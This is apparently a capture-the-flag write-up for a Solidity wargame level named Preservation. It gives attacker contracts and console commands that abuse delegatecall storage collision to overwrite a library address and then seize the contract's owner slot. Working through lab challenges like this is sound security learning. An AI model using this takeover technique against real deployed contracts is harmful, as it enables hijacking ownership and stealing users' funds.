1)
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationHack {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  constructor() public {}

  function setTime(uint256 _time) public {
    owner = address(uint160(_time));
  }

}
```
OR

2)
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationHack {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  constructor() public {}

  function setTime(uint256) public {
    owner = msg.sender;
  }
}
```

The delegatecall calls the another contract function such that the implementation code is that of the another contract but the state changes takes place on the contract running the delegatecall and also the msg.sender, msg.value etc on the called contract is that of the account calling the contract function with the delegatecall.

1) First step is to call setFirstTime function on the Preservation contract on the console with uint256 casted value of address of the PreservationHack contract. In my case 0x83A8aa134002dAAab1dc57d99968583c0057f0Ca is the PreservationHack contract address which is deployed using Remix.

```
await contract.setFirstTime(web3.eth.abi.encodeParameter('uint256', "0x83A8aa134002dAAab1dc57d99968583c0057f0Ca"));
```

web3.eth.abi.encodeParameter('uint256', "0x83A8aa134002dAAab1dc57d99968583c0057f0Ca") converts address which is uint160 to uint256. The conversion of 160bits to 256bits takes place by adding zeroes on the left until it becomes 256bits. So the result is uint256 i.e. 0x00000000000000000000000083a8aa134002daaab1dc57d99968583c0057f0ca

So after the first step the Library contract stores the uint256 _timestamp sent to the first slot and due to the nature of delegatecall the address of the PreservationHack contract is stored at slot 0 i.e timeZone1Library on Preservation contract. The uint256 is casted to address type which is 160bits so the original address of the PreservationContract is store. So now we can step into the second step of the attack.

2) So for the second step for the first PreservationHack contract we send uint256 casted value of the player address to set it to the third slot i.e owner on the Preservation contract.

```
await contract.setFirstTime(web3.eth.abi.encodeParameter('uint256', player));
```

For the second PreservationHack contract, we can send any uint256 as timestamp and owner will have the msg.sender value set as the context is of the Preservation contract but the implementation code used is of the PreservationHack contract.

```
await contract.setFirstTime(1);
```